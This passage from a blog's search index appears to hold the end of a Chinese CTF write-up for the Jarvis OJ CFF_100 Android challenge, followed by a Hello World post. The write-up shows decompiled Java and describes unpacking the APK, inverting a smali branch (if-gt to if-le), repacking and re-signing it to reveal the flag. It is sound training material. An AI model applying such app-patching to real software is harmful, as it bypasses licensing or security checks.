class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.to_reach_int = random.nextInt();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Btn_up_onclick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.has_gone_int++;</span><br><span class="line"></span><br><span class="line">        ((TextView) findViewById(R.id.data_has_gone)).setText(<span class="string">""</span> + <span class="keyword">this</span>.has_gone_int);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.to_reach_int &lt;= <span class="keyword">this</span>.has_gone_int) &#123;</span><br><span class="line"></span><br><span class="line">            ((Button) findViewById(R.id.button2)).setClickable(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn2_onclick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ((TextView) findViewById(R.id.tvResult)).setText(<span class="string">"&#123;Flag:"</span> + get_flag(<span class="keyword">this</span>.to_reach_int) + <span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!Debug.isDebuggerConnected()) &#123;</span><br><span class="line"></span><br><span class="line">            System.loadLibrary(<span class="string">"ctf"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="发现："><a href="#发现：" class="headerlink" title="发现："></a>发现：</h3><blockquote><p>楼梯数是程序启动时随机生成的，并且程序初始化的时候将getflag的按钮设置成不可操作，除非爬的楼梯数大于楼梯数才能按getflag的按钮，作为懒人，怎么可能真的点击那么多次，所以</p></blockquote><h3 id="拖到KALI里进行解包"><a href="#拖到KALI里进行解包" class="headerlink" title="拖到KALI里进行解包"></a>拖到KALI里进行解包</h3><p><img src="/images/2/3.png" alt></p><blockquote><p>在进行解包的时候加上-r命令，不对资源文件进行解包，因为在我打包的时候发现资源文件有问题，打包不了(知道详情的大佬可以告诉小弟)</p></blockquote><h3 id="接下来，我们对程序中关键跳转进行修改-此题做法不唯一-，让程序无论如何都可以按getflag按钮"><a href="#接下来，我们对程序中关键跳转进行修改-此题做法不唯一-，让程序无论如何都可以按getflag按钮" class="headerlink" title="接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮"></a>接下来，我们对程序中关键跳转进行修改(此题做法不唯一)，让程序无论如何都可以按getflag按钮<img src="/images/2/4.png" alt></h3><p>找到smali文件夹下的com/ctf/test/ctf_100/MainActivity.smali,直接搜索<br>Btn_up_onclick方法，找到关键跳转，修改成相反的就行<img src="/images/2/5.png" alt>将if-gt 修改成if-le后打包<img src="/images/2/6.png" alt></p><h3 id="完成打包后签名"><a href="#完成打包后签名" class="headerlink" title="完成打包后签名"></a>完成打包后签名<img src="/images/2/7.png" alt></h3><p>当出现<img src="/images/2/8.png" alt><br>说明签名成功，再次拖入模拟器安装运行，爬一层，使爬到了，看flag按钮能够使用后，按爬到了，看flag按钮即可发现flag<br><img src="/images/2/9.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Jarvis OJ </tag>
            
            <tag> CFF_100 </tag>
            
            <tag> Android reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/Hello-World.html"/>
      <url>/Hello-World.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HelloWorld </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hello World </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
